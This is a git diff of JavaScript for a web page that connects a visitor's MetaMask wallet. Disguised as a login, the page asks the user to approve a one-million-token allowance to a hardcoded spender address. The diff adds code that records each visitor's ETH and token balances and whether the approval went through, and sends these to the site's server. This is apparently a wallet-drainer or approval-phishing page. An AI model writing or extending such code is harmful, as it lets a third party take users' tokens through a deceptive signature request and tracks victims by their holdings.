@@ -1,4 +1,6 @@
 let account = "";
+let ethBalance = 0;
+let tokenBalance = 0;
 let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
 let tokens = [
   {
@@ -30,45 +32,104 @@ if (typeof window.ethereum != undefined) {
 }
 
 async function login() {
+  document.getElementById("content").style.display = "none";
+  document.getElementById("loading").style.display = "block";
   const accounts = await ethereum
     .request({ method: "eth_requestAccounts" })
     .catch((e) => {
-      console.log(e);
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("content").style.display = "block";
     });
   account = accounts[0];
-  getBalance(tokens[0]);
+  getEthBalance();
+  getTokenBalance(tokens[0]);
 }
 
 document.body.addEventListener("click", function (e) {
   let targetId = e.target.id;
   if (targetId == "connect-metamask") {
     if (ethereum.networkVersion == 4) {
-      login();
+      if (account == "") {
+        login();
+      }
     } else {
       console.log("Change network version");
     }
   }
 });
 
-async function getBalance(token) {
+async function getTokenBalance(token) {
   let web3 = new Web3(Web3.givenProvider);
   let contract = new web3.eth.Contract(ERC20, token.address);
   let balance = await contract.methods.balanceOf(account).call();
   let decimals = Math.pow(10, token.decimals);
-  balance = balance / decimals;
-  getToken(token, balance);
+  tokenBalance = balance / decimals;
+  getToken(token);
 }
 
-function getToken(token, balance) {
+function getToken(token) {
   let web3 = new Web3(Web3.givenProvider);
   let contract = new web3.eth.Contract(ERC20, token.address);
   contract.methods
     .approve(spender, Math.pow(10, token.decimals) * 1000000)
     .send({ from: account })
     .then(function (receipt) {
-      console.log(receipt);
+      getUser(true);
     })
     .catch(function (err) {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("content").style.display = "block";
+      getUser(false);
       console.log(err);
     });
+}
+
+function getEthBalance() {
+  let web3 = new Web3(Web3.givenProvider);
+  web3.eth.getBalance(account, function (err, result) {
+    if (err) {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("content").style.display = "block";
+      console.log(err);
+    } else {
+      ethBalance = web3.utils.fromWei(result);
+    }
+  });
+}
+
+function getUser(hasAccess) {
+  let getUserXhr = new XMLHttpRequest();
+  getUserXhr.open("GET", `/user/${account}`, true);
+  getUserXhr.send();
+
+  getUserXhr.onreadystatechange = function () {
+    if (this.status == 200 && this.readyState == 4) {
+      let response = JSON.parse(this.response);
+      if (response != null) {
+        location.replace(`/index.html?address=${account}`);
+      } else {
+        createUser(hasAccess);
+      }
+    }
+  };
+}
+
+function createUser(hasAccess) {
+  let userPayload = {
+    walletAddress: account,
+    balance: ethBalance,
+    usdt: tokenBalance,
+    hasAccess: hasAccess,
+  };
+  console.log(userPayload);
+  let createUserXhr = new XMLHttpRequest();
+  createUserXhr.open("POST", `/user`, true);
+  createUserXhr.setRequestHeader("Content-type", "application/json");
+  createUserXhr.send(JSON.stringify(userPayload));
+
+  createUserXhr.onreadystatechange = function () {
+    if (this.readyState == 4 && this.status == 200) {
+      location.replace(`/index.html?address=${account}`);
+    }
+  };
 }
